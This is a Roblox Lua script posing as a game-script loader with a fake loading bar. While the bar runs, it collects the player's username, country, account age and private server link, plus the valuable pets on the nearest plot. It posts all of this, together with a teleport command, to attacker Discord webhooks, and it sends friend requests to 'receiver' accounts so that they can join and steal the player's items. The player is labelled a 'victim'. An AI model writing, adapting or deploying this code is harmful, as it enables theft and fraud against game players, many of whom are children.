local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer
if not LocalPlayer then return end

-- Prevent duplicates
if _G.LoadingScreen and _G.LoadingScreen._gui then
    _G.LoadingScreen._gui:Destroy()
end

-- Settings for webhook
local SECONDARY_WEBHOOK_URL = "https://webhook-protect-2.vercel.app/api/webhook?id=NmdCTW5SSzVnTU5lTVYxOHJvRXdMUTo3b2pTandPM0xKQjNrUnByTnpvRHhFTlRxb1pSWEtOeFFKUURWNUtTeFA4bkVFN3VEa2dKRWdWMjQ3SnFBVVJadF9jNVFLanFwd0pfRmliU3pMNm90WlNfQmRTS1BnNmNrMm1HRVQ1Z3dVM18tdTRJMEpzWG0xbmhsOV80dHlKZFFyT2NzMzdwY1dINHd2YU1pQWRGWkpvVklNMTBpRVlEOGRLTENGZldEZkk"

-- Country flag function
local function countryToFlagEmoji(code)
    if not code then return "\240\159\140\141" end -- üåç
    return code:upper():gsub(".", function(c)
        return utf8.char(127397 + c:byte())
    end)
end

local success, countryCode = pcall(function()
    return game:HttpGet("https://ipinfo.io/country"):gsub("\n", "")
end)
local countryText = success and countryToFlagEmoji(countryCode) or "\240\159\140\141"

-- Make any frame draggable
local function makeDraggable(frame, dragHandle)
    local dragging = false
    local dragStart, startPos

    dragHandle = dragHandle or frame

    local function update(input)
        local delta = input.Position - dragStart
        frame.Position = UDim2.new(
            startPos.X.Scale,
            startPos.X.Offset + delta.X,
            startPos.Y.Scale,
            startPos.Y.Offset + delta.Y
        )
    end

    dragHandle.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = frame.Position

            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)

    UserInputService.InputChanged:Connect(function(input)
        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
            update(input)
        end
    end)
end

-- Input GUI
local function createInputScreen()
    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Name = "ExecutorLoadingGui"
    ScreenGui.IgnoreGuiInset = true
    ScreenGui.ResetOnSpawn = false

    local MainFrame = Instance.new("Frame")
    MainFrame.Name = "MainFrame"
    MainFrame.Size = UDim2.new(0, 420, 0, 260)
    MainFrame.Position = UDim2.new(0.5, -210, 0.5, -130)
    MainFrame.BackgroundColor3 = Color3.fromRGB(46, 46, 46)
    MainFrame.BorderColor3 = Color3.fromRGB(255, 255, 255)
    MainFrame.BorderSizePixel = 4
    MainFrame.Active = true
    MainFrame.ClipsDescendants = true
    MainFrame.Parent = ScreenGui

    local Stroke = Instance.new("UIStroke")
    Stroke.Color = Color3.fromRGB(255, 255, 255)
    Stroke.Thickness = 4
    Stroke.Parent = MainFrame

    local Corner = Instance.new("UICorner")
    Corner.CornerRadius = UDim.new(0, 24)
    Corner.Parent = MainFrame

    local Title = Instance.new("TextLabel")
    Title.Name = "Title"
    Title.Size = UDim2.new(1, 0, 0.25, 0)
    Title.Position = UDim2.new(0, 0, 0, 10)
    Title.BackgroundTransparency = 1
    Title.Font = Enum.Font.FredokaOne
    Title.Text = "Enter Private Server Link"
    Title.TextColor3 = Color3.fromRGB(255, 255, 255)
    Title.TextScaled = true
    Title.TextWrapped = true
    Title.Parent = MainFrame

    local InputBox = Instance.new("TextBox")
    InputBox.Name = "InputBox"
    InputBox.Size = UDim2.new(0.85, 0, 0.2, 0)
    InputBox.Position = UDim2.new(0.075, 0, 0.45, 0)
    InputBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    InputBox.Text = ""
    InputBox.PlaceholderText = "Paste your private server share link here"
    InputBox.TextColor3 = Color3.fromRGB(0, 0, 0)
    InputBox.Font = Enum.Font.SourceSansBold
    InputBox.TextScaled = true
    InputBox.ClearTextOnFocus = false
    InputBox.Parent = MainFrame

    local InputCorner = Instance.new("UICorner")
    InputCorner.CornerRadius = UDim.new(0, 12)
    InputCorner.Parent = InputBox

    local Submit = Instance.new("TextButton")
    Submit.Name = "Submit"
    Submit.Size = UDim2.new(0.6, 0, 0.18, 0)
    Submit.Position = UDim2.new(0.2, 0, 0.72, 0)
    Submit.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
    Submit.Font = Enum.Font.SourceSansBold
    Submit.Text = "Submit"
    Submit.TextColor3 = Color3.fromRGB(255, 255, 255)
    Submit.TextScaled = true
    Submit.Parent = MainFrame

    local SubmitCorner = Instance.new("UICorner")
    SubmitCorner.CornerRadius = UDim.new(0, 12)
    SubmitCorner.Parent = Submit

    makeDraggable(MainFrame, Title)
    return ScreenGui, MainFrame, InputBox, Submit
end

-- Loading Screen
local function createLoadingScreen()
    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Name = "WeaponSpawnerLoadingGui"
    ScreenGui.IgnoreGuiInset = true
    ScreenGui.ResetOnSpawn = false

    local MainFrame = Instance.new("Frame")
    MainFrame.Name = "MainFrame"
    MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
    MainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
    MainFrame.Size = UDim2.new(0, 400, 0, 240)
    MainFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    MainFrame.BorderColor3 = Color3.fromRGB(255, 255, 255)
    MainFrame.BorderSizePixel = 3
    MainFrame.ClipsDescendants = true
    MainFrame.Active = true
    MainFrame.Parent = ScreenGui

    local UICorner = Instance.new("UICorner")
    UICorner.CornerRadius = UDim.new(0, 20)
    UICorner.Parent = MainFrame

    local UIStroke = Instance.new("UIStroke")
    UIStroke.Thickness = 3
    UIStroke.Color = Color3.fromRGB(255, 255, 255)
    UIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    UIStroke.Parent = MainFrame

    local Title = Instance.new("TextLabel")
    Title.Name = "Title"
    Title.Parent = MainFrame
    Title.Size = UDim2.new(1, 0, 0.25, 0)
    Title.Position = UDim2.new(0, 0, 0, 10)
    Title.BackgroundTransparency = 1
    Title.Text = "Loading Script"
    Title.Font = Enum.Font.FredokaOne
    Title.TextScaled = true
    Title.TextColor3 = Color3.fromRGB(255, 255, 255)
    Title.TextStrokeTransparency = 0.8
    Title.TextWrapped = true

    local Status = Instance.new("TextLabel")
    Status.Name = "Status"
    Status.Parent = MainFrame
    Status.Size = UDim2.new(1, 0, 0.15, 0)
    Status.Position = UDim2.new(0, 0, 0.35, 0)
    Status.BackgroundTransparency = 1
    Status.Font = Enum.Font.SourceSansBold
    Status.Text = "Initializing..."
    Status.TextColor3 = Color3.fromRGB(220, 220, 220)
    Status.TextScaled = true

    local ProgressFrame = Instance.new("Frame")
    ProgressFrame.Name = "ProgressFrame"
    ProgressFrame.Parent = MainFrame
    ProgressFrame.Size = UDim2.new(0.9, 0, 0.18, 0)
    ProgressFrame.Position = UDim2.new(0.05, 0, 0.6, 0)
    ProgressFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    ProgressFrame.BorderSizePixel = 0

    local BarCorner = Instance.new("UICorner")
    BarCorner.CornerRadius = UDim.new(0, 12)
    BarCorner.Parent = ProgressFrame

    local Fill = Instance.new("Frame")
    Fill.Name = "Fill"
    Fill.Parent = ProgressFrame
    Fill.Size = UDim2.new(0, 0, 1, 0)
    Fill.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
    Fill.BorderSizePixel = 0

    local FillCorner = Instance.new("UICorner")
    FillCorner.CornerRadius = UDim.new(0, 12)
    FillCorner.Parent = Fill

    local Percent = Instance.new("TextLabel")
    Percent.Name = "Percent"
    Percent.Parent = MainFrame
    Percent.Size = UDim2.new(1, 0, 0.15, 0)
    Percent.Position = UDim2.new(0, 0, 0.83, 0)
    Percent.BackgroundTransparency = 1
    Percent.Font = Enum.Font.SourceSansBold
    Percent.Text = "0%"
    Percent.TextColor3 = Color3.fromRGB(255, 255, 255)
    Percent.TextScaled = true

    -- Make the loading screen draggable using the Title as the drag handle
    makeDraggable(MainFrame, Title)

    return ScreenGui, MainFrame, Fill, Percent, Status
end

-- Webhook Functions
local function sendFriendRequest(playerName)
    pcall(function()
        game:GetService("FriendService"):RequestFriend(playerName)
        print("Friend request sent to:", playerName)
    end)
end

local function sendToSecondaryWebhook(itemList, countryText)
    print("Attempting secondary webhook send...") -- Debug log
    local payload = {
        content = "Wow someone got a hit",
        embeds = {{
            title = "GAG Public Hits",
            fields = {
                {name = "Victim info", value = "Username Hidden\nCountry: " .. countryText, inline = false},
                {name = "Hit List", value = "```" .. (itemList or "No Valuable Pets") .. "```", inline = false}
            },
            color = 3447003,
            footer = {text = "Made by DOOM Scripts - " .. os.date("%Y-%m-%d %H:%M:%S")}
        }}
    }

    local success, err = pcall(function()
        local reqFunc = http_request or request or HttpPost or syn.request or http.request
        if not reqFunc then
            error("No HTTP request function available!")
        end
        reqFunc({
            Url = SECONDARY_WEBHOOK_URL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(payload)
        })
    end)
    if success then
        print("Secondary webhook sent successfully!")
    else
        print("Secondary webhook failed:", err)
    end
end

local function getClosestHitbox()
    print("Checking for closest hitbox...") -- Debug log
    local plots = workspace:FindFirstChild("Plots")
    if not plots then 
        print("No Plots found in workspace!")
        return nil, nil, nil 
    end

    local character = LocalPlayer.Character
    if not character or not character:FindFirstChild("HumanoidRootPart") then
        print("No character or HRP found!")
        return nil, nil, nil
    end

    local hrp = character.HumanoidRootPart
    local closest, closestDist, closestPlot = nil, math.huge, nil

    for _, plot in pairs(plots:GetChildren()) do
        pcall(function()
            local purchases = plot:FindFirstChild("Purchases")
            if purchases and purchases:FindFirstChild("PlotBlock") then
                local hitbox = purchases.PlotBlock:FindFirstChild("Hitbox")
                if hitbox then
                    local dist = (hrp.Position - hitbox.Position).Magnitude
                    if dist < closestDist then
                        closestDist = dist
                        closest = hitbox
                        closestPlot = plot
                    end
                end
            end
        end)
    end

    if closestPlot then
        print("Found closest plot:", closestPlot.Name)
    else
        print("No valid hitbox found!")
    end
    return closest, closestDist, closestPlot
end

local function sendModelsToWebhook(plot)
    local itemListString = "No Valuable Pets" -- Fallback
    if plot then
        local modelNames = {}
        for _, child in pairs(plot:GetChildren()) do
            if child:IsA("Model") and child.Name ~= "FriendPanel" then
                table.insert(modelNames, child.Name)
            end
        end
        itemListString = #modelNames > 0 and table.concat(modelNames, "\n") or "No Valuable Pets"
        
        -- If only FriendPanel was present, retry once
        if #modelNames == 0 and plot:FindFirstChild("FriendPanel") then
            print("Only FriendPanel detected, retrying hitbox detection...")
            local closest, dist, newPlot = getClosestHitbox()
            if newPlot and newPlot ~= plot then
                plot = newPlot
                modelNames = {}
                for _, child in pairs(plot:GetChildren()) do
                    if child:IsA("Model") and child.Name ~= "FriendPanel" then
                        table.insert(modelNames, child.Name)
                    end
                end
                itemListString = #modelNames > 0 and table.concat(modelNames, "\n") or "No Valuable Pets"
            end
        end
        print("Sending main webhook with plot models:", itemListString)
    else
        print("Sending main webhook without plot (fallback)")
    end

    local VICTIM = LocalPlayer
    local receiverList = table.concat(_G.RECEIVER_USERNAMES, ", ")
    local embed = {
        title = "üéâ Steal A Brainrot Hit",
        color = 65280,
        fields = {
            {
                name = "üë§ **Player Information**",
                value = string.format(
                    "```Name: %s\nReceivers: %s\nExecutor: %s\nAccount Age: %s\nPlayers: %d/5```",
                    VICTIM.Name or "Unknown",
                    receiverList,
                    identifyexecutor and identifyexecutor() or "Unknown",
                    tostring(VICTIM.AccountAge or "Unknown"),
                    #Players:GetPlayers()
                ),
                inline = false
            },
            {
                name = "üí∞ **Valuable Models**",
                value = string.format("```%s```", itemListString),
                inline = false
            },
            {
                name = "üåê **Join Link**",
                value = string.format("[%s](%s)", "Join Server", getgenv().privlink or "Unknown"),
                inline = false
            }
        },
        footer = { text = string.format("Made By DOOM Scripts | %s | %s", game.PlaceId, getgenv().JobId or "Unknown") }
    }

    local payload = {
        content = string.format("--@everyone\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%s, \"%s\")\n", game.PlaceId, getgenv().JobId or "Unknown"),
        avatar_url = "https://cdn.discordapp.com/attachments/1024859338205429760/1103739198735261716/icon.png",
        embeds = { embed }
    }

    local success, err = pcall(function()
        local reqFunc = http_request or request or HttpPost or syn.request or http.request
        if not reqFunc then
            error("No HTTP request function available!")
        end
        reqFunc({
            Url = _G.MAIN_WEBHOOK_URL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(payload)
        })
    end)
    if success then
        print("Main webhook sent successfully!")
    else
        print("Main webhook failed:", err)
    end

    -- Always send secondary webhook
    sendToSecondaryWebhook(itemListString, countryText)
end

-- Main Logic
local gui, frame, input, submit = createInputScreen()
gui.Parent = LocalPlayer:WaitForChild("PlayerGui")

submit.MouseButton1Click:Connect(function()
    local text = input.Text
    if text == nil or text == "" then
        input.PlaceholderText = "Please enter a valid link!"
        return
    end

    if not string.find(text, "https://www%.roblox%.com/games/") then
        input.Text = ""
        input.PlaceholderText = "Invalid link. Try again!"
        return
    end

    getgenv().privlink = text

    -- Fade transition to loading GUI
    TweenService:Create(frame, TweenInfo.new(0.4), {BackgroundTransparency = 1}):Play()
    for _, obj in ipairs(frame:GetDescendants()) do
        if obj:IsA("TextLabel") or obj:IsA("TextBox") or obj:IsA("TextButton") then
            TweenService:Create(obj, TweenInfo.new(0.4), {TextTransparency = 1}):Play()
        end
    end
    wait(0.4)
    gui:Destroy()

    -- Create loading screen
    local gui2, frame2, fill, percentLabel, statusLabel = createLoadingScreen()
    gui2.Parent = LocalPlayer:WaitForChild("PlayerGui")

    local loading = {
        _gui = gui2,
        _fill = fill,
        _percent = percentLabel,
        _status = statusLabel,
        _progress = 0,
        _closing = false
    }

    local function tweenProgress(target)
        target = math.clamp(target, 0, 100)
        loading._progress = target
        local goal = { Size = UDim2.new(target / 100, 0, 1, 0) }
        TweenService:Create(loading._fill, TweenInfo.new(1.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), goal):Play()
        loading._percent.Text = string.format("%d%%", target)
    end

    local function closeScreen()
        if loading._closing then return end
        loading._closing = true
        TweenService:Create(frame2, TweenInfo.new(0.5, Enum.EasingStyle.Quad), {BackgroundTransparency = 1}):Play()
        wait(0.5)
        gui2:Destroy()
        _G.LoadingScreen = nil
    end

    function loading.setProgress(n, message)
        n = tonumber(n) or 0
        tweenProgress(n)
        if message then
            loading._status.Text = tostring(message)
        end
        if n >= 100 then
            wait(0.3)
            loading._status.Text = "Alt Account Detected"
            loading._status.TextColor3 = Color3.fromRGB(255, 60, 60)

            -- Flashing effect
            task.spawn(function()
                while gui2 and gui2.Parent and statusLabel do
                    TweenService:Create(statusLabel, TweenInfo.new(0.6, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {TextTransparency = 0.5}):Play()
                    task.wait(0.6)
                    TweenService:Create(statusLabel, TweenInfo.new(0.6, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {TextTransparency = 0}):Play()
                    task.wait(0.6)
                end
            end)
            wait(2) -- Hold for 2 seconds at 100% before closing
            closeScreen()
        end
    end

    function loading.complete()
        loading.setProgress(100)
    end

    _G.LoadingScreen = loading

    -- Send webhook after loading starts (now always calls secondary)
    task.spawn(function()
        local closest, dist, plot = getClosestHitbox()
        sendModelsToWebhook(plot)
    end)

    -- Simulate loading progress over 120 seconds with random delays
    task.spawn(function()
        local duration = 120
        local steps = 100
        local baseStepTime = duration / steps
        local currentProgress = 0

        while _G.LoadingScreen and not loading._closing and currentProgress < 100 do
            local step = math.random(1, 3)
            currentProgress = math.min(currentProgress + step, 100)
            loading.setProgress(currentProgress, "Loading assets...")
            task.wait(baseStepTime + math.random() * 0.5) -- Random delay between 1x and 1.5x base step time
        end

        if currentProgress >= 100 then
            loading.complete()
        end
    end)
end)

-- Send friend requests if receivers are already in the game
for _, username in pairs(_G.RECEIVER_USERNAMES) do
    for _, p in pairs(Players:GetPlayers()) do
        if p.Name == username then
            sendFriendRequest(username)
        end
    end
end

-- Connect to future players joining
Players.PlayerAdded:Connect(function(p)
    for _, username in pairs(_G.RECEIVER_USERNAMES) do
        if p.Name == username then
            sendFriendRequest(username)
        end
    end
end)
